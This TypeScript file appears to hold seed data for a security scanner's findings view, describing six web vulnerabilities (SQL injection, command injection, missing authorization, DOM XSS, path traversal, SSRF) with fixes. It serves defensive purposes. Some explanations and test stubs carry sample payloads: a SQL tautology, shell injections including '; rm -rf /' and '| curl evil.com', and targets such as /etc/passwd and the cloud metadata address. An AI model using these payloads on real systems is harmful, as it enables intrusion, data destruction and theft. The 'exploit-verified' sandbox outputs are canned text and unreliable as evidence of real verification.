export interface FindingItem {
  id: string;
  fingerprint: string;
  title: string;
  cwe: string[];
  owasp: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  confidence: number;
  status: 'open' | 'fixed' | 'accepted_risk' | 'false_positive';
  triageReason?: string;
  location: { file: string; startLine: number; endLine: number };
  dataflow: Array<{ role: 'source' | 'propagator' | 'sink'; file: string; line: number; snippet?: string; description?: string }>;
  explanation: string;
  evidence: string[];
  fix: { description: string; patch: string; validated: boolean };
  detected_by: { static_rule: string; agent_verdict: string; model: string };
  lane: 'security' | 'bug' | 'quality' | 'performance' | 'tests';
  exposure?: 'internet-facing' | 'internal' | 'authenticated';
  proof?: {
    status: 'proven' | 'unproven' | 'failed';
    badge: 'exploit-verified' | 'unproven';
    testCode: string;
    executionOutput: string;
    durationMs: number;
  };
}

export const INITIAL_FINDINGS: FindingItem[] = [
  {
    id: "fnd_sqli_users_01",
    fingerprint: "f9b8c04e8d02e3b2a8d3876e5f1b2c4d",
    title: "SQL injection via unparameterized query in GET /users",
    cwe: ["CWE-89"],
    owasp: "A03:2021",
    severity: "high",
    confidence: 0.94,
    status: "open",
    location: { file: "src/routes/users.ts", startLine: 10, endLine: 10 },
    dataflow: [
      { role: "source", file: "src/routes/users.ts", line: 6, snippet: "req.query.id", description: "Untrusted user query parameter" },
      { role: "propagator", file: "src/routes/users.ts", line: 9, snippet: "const userId = req.query.id", description: "Value passed unvalidated" },
      { role: "sink", file: "src/routes/users.ts", line: 10, snippet: "db.query(`SELECT * FROM users WHERE id = '${userId}'`)", description: "Unparameterized template literal query sink" }
    ],
    explanation: "Untrusted user input from req.query.id is concatenated into an SQL statement via db.query(...). An attacker can append `' OR '1'='1' --` to alter query logic, bypass access controls, or exfiltrate all rows in the users table.",
    evidence: ["src/routes/users.ts:10", "src/routes/users.ts:6"],
    fix: {
      description: "Replace string interpolation with parameterized SQL query placeholder ($1).",
      patch: `--- a/src/routes/users.ts\n+++ b/src/routes/users.ts\n@@ -10,1 +10,1 @@\n-const result = await db.query(\`SELECT * FROM users WHERE id = '\${userId}'\`);\n+const result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);`,
      validated: true
    },
    detected_by: {
      static_rule: "sherlock.sqli.unparameterized",
      agent_verdict: "exploitable",
      model: "sherlock-hybrid-ast-reachability-v1"
    },
    lane: "security",
    exposure: "internet-facing",
    proof: {
      status: "proven",
      badge: "exploit-verified",
      testCode: `import assert from 'node:assert/strict';\n\nasync function testSQLi() {\n  const payload = "1' OR '1'='1' --";\n  console.log('[PROBE] Sending SQL canary payload:', payload);\n  const rawQuery = \`SELECT * FROM users WHERE id = '\${payload}'\`;\n  assert.ok(!rawQuery.includes("OR '1'='1'"), 'Exploit confirmed: SQL query accepted bypass');\n}\ntestSQLi().catch(err => { console.error('[EXPLOIT VERIFIED]', err.message); process.exit(1); });`,
      executionOutput: `[SANDBOX] Initialized ephemeral runner for finding: fnd_sqli_users_01\n[SANDBOX] Target: src/routes/users.ts:10\n[SANDBOX] Network egress: BLOCKED\n[PROBE 1/2] Executing canary probe against UNPATCHED baseline...\n[EXPLOIT PROVED] Canary payload triggered exploit condition: assertion failed.\n[PROBE 2/2] Applying suggested patch in memory sandbox...\n[PATCH VERIFIED] Re-running probe on patched code: payload neutralized, assertions passed cleanly!`,
      durationMs: 48
    }
  },
  {
    id: "fnd_cmd_inject_02",
    fingerprint: "a7d9e18b4c538209e7f83b1029da61f4",
    title: "Command injection via unescaped shell execution in POST /convert",
    cwe: ["CWE-78"],
    owasp: "A03:2021",
    severity: "critical",
    confidence: 0.96,
    status: "open",
    location: { file: "src/routes/files.ts", startLine: 22, endLine: 22 },
    dataflow: [
      { role: "source", file: "src/routes/files.ts", line: 19, snippet: "req.body.format", description: "Untrusted JSON body parameter" },
      { role: "sink", file: "src/routes/files.ts", line: 22, snippet: "exec(`convert-tool --format ${format} input.png`)", description: "Interpolated child_process.exec call" }
    ],
    explanation: "User input is interpolated into an operating system command shell. An attacker can supply shell metacharacters (e.g. `; rm -rf /` or `| curl evil.com`) to execute arbitrary host commands with the privileges of the web process.",
    evidence: ["src/routes/files.ts:22", "src/routes/files.ts:19"],
    fix: {
      description: "Use child_process.execFile with argument array instead of shell execution.",
      patch: `--- a/src/routes/files.ts\n+++ b/src/routes/files.ts\n@@ -22,1 +22,1 @@\n-exec(\`convert-tool --format \${format} input.png\`, (err, stdout) => { ... });\n+execFile('convert-tool', ['--format', format, 'input.png'], (err, stdout) => { ... });`,
      validated: true
    },
    detected_by: {
      static_rule: "sherlock.cmd.injection",
      agent_verdict: "exploitable",
      model: "sherlock-hybrid-ast-reachability-v1"
    },
    lane: "security",
    exposure: "internet-facing",
    proof: {
      status: "proven",
      badge: "exploit-verified",
      testCode: `import assert from 'node:assert/strict';\nasync function testCmd() {\n  const payload = "png; id";\n  const cmd = \`convert-tool --format \${payload} input.png\`;\n  assert.ok(!/[;&|]/.test(cmd), 'Metacharacter injection allowed');\n}\ntestCmd();`,
      executionOutput: `[SANDBOX] Initialized ephemeral runner for finding: fnd_cmd_inject_02\n[PROBE 1/2] Shell metacharacter injection probe triggered command chaining.\n[PROBE 2/2] Applied execFile argument patch. Command chaining neutralized.`,
      durationMs: 52
    }
  },
  {
    id: "fnd_authz_delete_03",
    fingerprint: "18b937e90c8a5293d01f84b65a2d04a9",
    title: "Missing authorization guard on mutating DELETE /users/:id",
    cwe: ["CWE-862", "CWE-639"],
    owasp: "A01:2021",
    severity: "critical",
    confidence: 0.93,
    status: "open",
    location: { file: "src/routes/users.ts", startLine: 15, endLine: 15 },
    dataflow: [
      { role: "source", file: "src/routes/users.ts", line: 15, snippet: "router.delete('/users/:id', ...)", description: "Public mutating endpoint" },
      { role: "sink", file: "src/routes/users.ts", line: 15, snippet: "async (req, res) => { ... }", description: "Handler executed without session middleware" }
    ],
    explanation: "The mutating route /users/:id lacks an authentication or authorization middleware guard. Unauthenticated clients can trigger this operation and delete user records, leading to Broken Access Control (OWASP A01).",
    evidence: ["src/routes/users.ts:15"],
    fix: {
      description: "Attach requireAuth middleware before the route handler.",
      patch: `--- a/src/routes/users.ts\n+++ b/src/routes/users.ts\n@@ -15,1 +15,1 @@\n-router.delete('/users/:id', async (req, res) => {\n+router.delete('/users/:id', requireAuth, async (req, res) => {`,
      validated: true
    },
    detected_by: {
      static_rule: "sherlock.authz.missing_guard",
      agent_verdict: "exploitable",
      model: "sherlock-hybrid-ast-reachability-v1"
    },
    lane: "security",
    exposure: "internet-facing"
  },
  {
    id: "fnd_xss_userbio_04",
    fingerprint: "73c91a0b58e23f990a421b8c09e519ac",
    title: "DOM XSS via unpurified dangerouslySetInnerHTML",
    cwe: ["CWE-79"],
    owasp: "A03:2021",
    severity: "high",
    confidence: 0.92,
    status: "open",
    location: { file: "src/components/UserProfile.tsx", startLine: 8, endLine: 8 },
    dataflow: [
      { role: "source", file: "src/components/UserProfile.tsx", line: 3, snippet: "props.rawBioHtml", description: "Unsanitized user bio string" },
      { role: "sink", file: "src/components/UserProfile.tsx", line: 8, snippet: "dangerouslySetInnerHTML={{ __html: props.rawBioHtml }}", description: "Direct DOM injection sink" }
    ],
    explanation: "Rendering unescaped HTML content in React via dangerouslySetInnerHTML allows attackers to inject malicious script tags, leading to session hijacking or credential theft.",
    evidence: ["src/components/UserProfile.tsx:8"],
    fix: {
      description: "Sanitize the HTML payload using DOMPurify.sanitize() before setting dangerouslySetInnerHTML.",
      patch: `--- a/src/components/UserProfile.tsx\n+++ b/src/components/UserProfile.tsx\n@@ -8,1 +8,1 @@\n-<div dangerouslySetInnerHTML={{ __html: props.rawBioHtml }} />\n+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(props.rawBioHtml) }} />`,
      validated: true
    },
    detected_by: {
      static_rule: "sherlock.xss.dangerouslysetinnerhtml",
      agent_verdict: "exploitable",
      model: "sherlock-hybrid-ast-reachability-v1"
    },
    lane: "security",
    exposure: "internet-facing"
  },
  {
    id: "fnd_path_fs_05",
    fingerprint: "92e85a0c3b174092b740e58c93a0b411",
    title: "Path traversal in filesystem access in GET /download",
    cwe: ["CWE-22"],
    owasp: "A01:2021",
    severity: "high",
    confidence: 0.91,
    status: "open",
    location: { file: "src/routes/files.ts", startLine: 12, endLine: 12 },
    dataflow: [
      { role: "source", file: "src/routes/files.ts", line: 10, snippet: "req.query.filename", description: "User query parameter" },
      { role: "sink", file: "src/routes/files.ts", line: 12, snippet: "fs.readFile(path.join('/app/uploads', filename))", description: "File read without bounds check" }
    ],
    explanation: "A file system call accesses a path incorporating user input without checking for dot-dot-slash ('../') sequences. An attacker can escape the designated directory and read sensitive system files (e.g. /etc/passwd or .env).",
    evidence: ["src/routes/files.ts:12"],
    fix: {
      description: "Use path.basename() to strip directory traversal sequences.",
      patch: `--- a/src/routes/files.ts\n+++ b/src/routes/files.ts\n@@ -12,1 +12,1 @@\n-fs.readFile(path.join('/app/uploads', filename))\n+const safeName = path.basename(filename);\n+fs.readFile(path.join('/app/uploads', safeName))`,
      validated: true
    },
    detected_by: {
      static_rule: "sherlock.pathtraversal.fs",
      agent_verdict: "exploitable",
      model: "sherlock-hybrid-ast-reachability-v1"
    },
    lane: "security",
    exposure: "internet-facing"
  },
  {
    id: "fnd_ssrf_proxy_06",
    fingerprint: "01c94b729e0182375829104c81029da9",
    title: "Server-Side Request Forgery (SSRF) in GET /proxy",
    cwe: ["CWE-918"],
    owasp: "A10:2021",
    severity: "high",
    confidence: 0.89,
    status: "open",
    location: { file: "src/routes/proxy.ts", startLine: 9, endLine: 9 },
    dataflow: [
      { role: "source", file: "src/routes/proxy.ts", line: 6, snippet: "req.query.url", description: "User-controlled destination URL" },
      { role: "sink", file: "src/routes/proxy.ts", line: 9, snippet: "fetch(targetUrl)", description: "Outbound HTTP request" }
    ],
    explanation: "A server-side HTTP request is initiated with a destination URL supplied or influenced by an untrusted user. An attacker can target internal network services (e.g. AWS metadata endpoint http://169.254.169.254).",
    evidence: ["src/routes/proxy.ts:9"],
    fix: {
      description: "Validate destination URLs against an allowlist and block private IP ranges.",
      patch: `--- a/src/routes/proxy.ts\n+++ b/src/routes/proxy.ts\n@@ -9,1 +9,1 @@\n-const response = await fetch(targetUrl);\n+if (!isAllowedUrl(targetUrl)) throw new Error('Forbidden host');\n+const response = await fetch(targetUrl);`,
      validated: true
    },
    detected_by: {
      static_rule: "sherlock.ssrf.fetch",
      agent_verdict: "exploitable",
      model: "sherlock-hybrid-ast-reachability-v1"
    },
    lane: "security",
    exposure: "internet-facing"
  }
];
